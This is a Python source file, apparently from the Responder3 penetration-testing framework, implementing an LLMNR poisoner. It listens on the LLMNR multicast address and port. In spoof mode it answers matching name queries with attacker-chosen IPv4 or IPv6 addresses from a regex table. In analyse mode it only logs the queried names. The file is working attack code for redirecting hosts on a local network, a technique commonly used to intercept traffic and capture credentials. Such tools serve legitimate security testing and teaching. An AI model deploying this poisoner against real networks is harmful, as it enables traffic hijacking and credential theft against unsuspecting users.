import socket
import struct
import logging
import asyncio
import ipaddress
import traceback

from responder3.core.commons import *
from responder3.protocols.LLMNR import * 
from responder3.protocols.DNS import * 
from responder3.core.servertemplate import ResponderServer, ResponderServerSession


class LLMNRSession(ResponderServerSession):
	pass

class LLMNR(ResponderServer):
	def custom_socket(server_properties):
		if server_properties.bind_addr.version == 4:
			ip = ipaddress.ip_address('224.0.0.252')
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
			sock.setblocking(False)#SUPER IMPORTANT TO SET THIS FOR ASYNCIO!!!!
			sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
			sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
			sock.bind(('0.0.0.0', 5355))
			mreq = struct.pack("=4sl", server_properties.bind_addr.packed, socket.INADDR_ANY)
			sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

		else:
			#http://code.activestate.com/recipes/442490-ipv6-multicast/
			ip = ipaddress.ip_address('FF02:0:0:0:0:0:1:3')
			interface_index = socket.if_nametoindex('ens33')
			sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
			sock.bind(('::', 5355, 0, interface_index))
			sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP,
				struct.pack('16sI', ip.packed, interface_index))
			sock.setblocking(False)#SUPER IMPORTANT TO SET THIS FOR ASYNCIO!!!!

		return sock

	def init(self):
		self.parser = LLMNRPacket
		self.spoofTable = []
		if self.settings is None:
			self.log(logging.INFO, 'No settings defined, adjusting to Analysis functionality!')
			self.settings = {}
			self.settings['mode'] = PoisonerMode.ANALYSE

		else:
			#parse the poisoner mode
			if isinstance(self.settings['mode'], str):
				self.settings['mode'] = PoisonerMode[self.settings['mode'].upper()]

			#compiling re strings to actual re objects and converting IP strings to IP objects
			if self.settings['mode'] == PoisonerMode.SPOOF:
				for exp in self.settings['spooftable']:
					self.spoofTable.append((re.compile(exp),ipaddress.ip_address(self.settings['spooftable'][exp])))

	@asyncio.coroutine
	def parse_message(self):
		msg = yield from asyncio.wait_for(self.parser.from_streamreader(self.creader), timeout=1)
		return msg

	@asyncio.coroutine
	def send_data(self, data):
		yield from asyncio.wait_for(self.cwriter.write(data), timeout=1)
		return

	@asyncio.coroutine
	def run(self):
		try:
			msg = yield from asyncio.wait_for(self.parse_message(), timeout=1)
			if self.settings['mode'] == PoisonerMode.ANALYSE:
				for q in msg.Questions:
					self.logPoisonResult(requestName = q.QNAME.name)

			else:
				answers = []
				for targetRE, ip in self.spoofTable:
					for q in msg.Questions:
						if targetRE.match(q.QNAME.name):
							self.logPoisonResult(requestName = q.QNAME.name, poisonName = str(targetRE), poisonIP = ip)
							if ip.version == 4:
								res = DNSAResource.construct(q.QNAME.name, ip)
							elif ip.version == 6:
								res = DNSAAAAResource.construct(q.QNAME.name, ip)
							else:
								raise Exception('This IP version scares me...')
							answers.append(res)
				
				response = LLMNRPacket.construct(  TID = msg.TransactionID, 
									 response = LLMNRResponse.RESPONSE, 
									 answers = answers,
									 questions = msg.Questions
								  )
				yield from asyncio.wait_for(self.send_data(response.toBytes()), timeout=1)

		except Exception as e:
			traceback.print_exc()
			self.log('Exception! %s' % (str(e),))
			pass


